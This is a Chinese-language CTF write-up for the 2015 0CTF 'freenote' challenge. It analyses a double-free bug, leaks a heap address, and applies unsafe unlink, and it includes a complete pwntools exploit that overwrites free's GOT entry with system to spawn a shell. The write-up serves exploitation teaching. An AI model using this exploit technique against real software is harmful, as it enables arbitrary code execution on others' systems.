---
title: 2015 0ctf freenote writeup
date: 2017-10-03 16:26:40
tags:
- heap
- double free
- pwn
---

这道题的堆指针没有清空，导致释放堆内存后仍然指针任然指向堆，由于释放指针没有有效性检查，经过再次申请重新利用释放掉的内存，可以再将原来释放的堆指针再次释放。
<!-- more -->
# 分析
拿到这道题，先看软件开启了什么保护。
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

64位小端对齐程序，开启了`canary`和`NX`保护，运行程序发现程序有如下功能。
	
	== 0ops Free Note ==
	1. List Note
	2. New Note
	3. Edit Note
	4. Delete Note
	5. Exit
	====================

将程序拖入IDA中，很快定位漏洞位置。在操作`4`中，`free`堆内存后并没有将指针置`NULL`。
```
if ( v1 >= 0 && (signed __int64)v1 < *(_QWORD *)qword_6020A8 )
    {
      --*(_QWORD *)(qword_6020A8 + 8);
      *(_QWORD *)(qword_6020A8 + 24LL * v1 + 16) = 0LL;
      *(_QWORD *)(qword_6020A8 + 24LL * v1 + 24) = 0LL;
      free(*(void **)(qword_6020A8 + 24LL * v1 + 32));
      result = puts("Done.");
    }
```

要理解程序，需要理解全局变量`qword_6020A8`。它的初始化在`sub_400A49`中。`qword_6020A8`是个指针，指向了0x1810大小的内存。
第一个元素保存256，从循环看，这个应该是256个最大值的意思。
第二个元素保存存储note的数量。
之后是每个note的结构体信息，每个结构体24字节，第一个标记变量note[i]->flag，1表示有效，0表示无效；第二个保存note的长度note[i]->length；第三个保存note的指针note[i]->str，通过`malloc`申请内存，最小128，最大4096长度。
```
_QWORD *sub_400A49()
{
  _QWORD *v0; // rax@1
  _QWORD *result; // rax@1
  signed int i; // [sp+Ch] [bp-4h]@1

  v0 = malloc(0x1810uLL);
  qword_6020A8 = (__int64)v0;
  *v0 = 256LL;
  result = (_QWORD *)qword_6020A8;
  *(_QWORD *)(qword_6020A8 + 8) = 0LL;
  for ( i = 0; i <= 255; ++i )
  {
    *(_QWORD *)(qword_6020A8 + 24LL * i + 16) = 0LL;
    *(_QWORD *)(qword_6020A8 + 24LL * i + 24) = 0LL;
    result = (_QWORD *)(qword_6020A8 + 24LL * i + 32);
    *result = 0LL;
  }
  return result;
}
```

# unlink

可以通过我博客里面的`unsafe unlink`来达到任意地址的读写。这时候需要一个全局指针来作为`victim`。前文分析到，note[i]->str指向了堆，而且note[i]还保存在堆上,所以有必要泄露堆地址来获取victim。

# 泄露堆地址

由于字符串读入时，没有补`\0`，所以输出时可以一直把后面的内容打印出来。可以申请多个`small chunk`的堆并释放其中几个，几个small chunk保存在unsorted bins内，让某个freed的chunk（比如A）的bk指向另一个freed chunk（比如B）,然后重新申请A的大小内存，将A块从unsorted bins中释放出来，再次打印A块的内容即可泄露堆内存地址。

这里我学到了一个新的gdb命令，`vmmap`来展示整个内存空间的映射。找到heap一栏，堆内存的起始地址可以查找。

# double free思路

1. 先连续申请4个0x80字节的堆内存，分别计为note0，note1，note2，note3。chunk大小为0x90。
2. 先释放note0，再释放note2，分隔释放防止堆块合并。
3. 重新申请0x80，内容少于8字节，不要覆盖bk指针，可以获取到note0。然后打印note0的内容可以leak堆地址，进而推算出note[i]->str地址。我这里取note[0]->str, 因为note[0]->str = note0。 
4. 将note0,note1,note3释放掉。
5. 然后我们申请3个note,分别记为n_note0, n_note1, n_note2。因为我们要再次free note3。
6. 利用unsafe unlink重新构造n_note0,n_note1,n_note2。具体如何构造，参见<http://rk700.github.io/2015/04/21/0ctf-freenote/>
7. 再次释放note3，拿到note[0]->str，其指向了比它低3个地址长度的地址。
8. 先利用victim指针指向free的got地址，泄露其在内存中加载的地址。
9. 利用libc中free与system相对便宜地址，计算system在内存中加载的地址。
10. 将system内存地址存入free的got表中，覆盖free内存地址。
11. 将/bin/sh写入note中，free掉此note，相当于执行了system('bin/sh')。PWN!

# 总结

1. `vmmap`常用，可以方便的查看包括堆内存分配情况。
2. pwntools工具中关于`recv`函数，有个参数`keepends`表示接受行是否保留\x0a，有时候不需要换行符`\n`，可以将其置为`False`。
3. unsafe unlink熟练运用，达到任意地址读和写的目的。

# 代码

```
from pwn import *
debug=True
p = process('./freenote')
if debug:
    #context.log_level="debug"
    libc = p.libc
    # breakpoint: list note,
    gdb.attach(p, 'b*0x0000000000400B96')
else:
    libc=ELF('./libc.so.6_1')
def new_note(content):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Length of new note: ')
    p.sendline(str(len(content)))
    p.recvuntil('Enter your note: ')
    p.send(content)

def list_note(index=0):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil(str(index)+'. ')
    # keepends can remove \x0a
    return p.recvline(keepends=False)

def delete_note(index):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Note number: ')
    p.sendline(str(index))

def edit_note(index, content):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Note number: ')
    p.sendline(str(index))
    p.recvuntil('Length of note: ')
    p.sendline(str(len(content)))
    p.recvuntil('Enter your note: ')
    p.send(content)


# new 4 notes
# 0x90+0x90+0x90+0x90
for i in range(0,4):
    new_note('A')

delete_note(0)
delete_note(2)
# leak note 2 address
new_note('12345678')
#heap_note2 = u64(list_note(0)[8:])
addr_half = list_note(0)[8:]
heap_note2 = u64(addr_half.ljust(8, '\x00'))
log.success("note 2 is at %#x"%heap_note2)
heap_addr = heap_note2-0x90-0x90-0x1820+0x10
log.success("heap is at %#x"%heap_addr)

# construct false heap
delete_note(0)
delete_note(1)
delete_note(3)
ptr0 = heap_addr+ 32
# fake note0
# 0
# payload0size = 0x80+0x90+0x90
# fd= ptr0-0x18
# bk= ptr0-0x10
# padding, size = 0x80+0x90+0x90-0x20
# prev_payload0size
# 0x90
# padding, size=0x80
# prev_size=0
# 0x91
# padding, size=0x80
payload0size = 0x80+0x90+0x90
payload0 = p64(0)+ p64(payload0size|1)+ p64(ptr0-0x18)+p64(ptr0-0x10)
payload2 = 'A'*0x80 + p64(payload0size)+p64(0x90)+'A'*0x80+\
        (p64(0)+p64(0x91)+'A'*0x80)*2
new_note(payload0)# note0
payload1 = '/bin/sh\x00'
new_note(payload1)# note1
new_note(payload2)
# just for debug
#list_note(0)

delete_note(3)
# get system addr
# 0000000000602018 R_X86_64_JUMP_SLOT  free
free_got = 0x602018
payload = p64(10)+p64(1)+p64(8)+p64(free_got)

edit_note(0, payload)
free_addr = u64(list_note(0).ljust(8, '\x00'))
log.success('free address is at %#x'%free_addr )

system_addr = free_addr + libc.symbols['system']-libc.symbols['free']

edit_note(0, p64(system_addr))
delete_note(1)

p.interactive()

```


# 参考
[1] [Command vmmap](https://gef.readthedocs.io/en/latest/commands/vmmap/)
[2] [0CTF freenote](http://rk700.github.io/2015/04/21/0ctf-freenote/)
[3] [0ctf 2015 Freenote Write Up](http://winesap.logdown.com/posts/258859-0ctf-2015-freenode-write-up)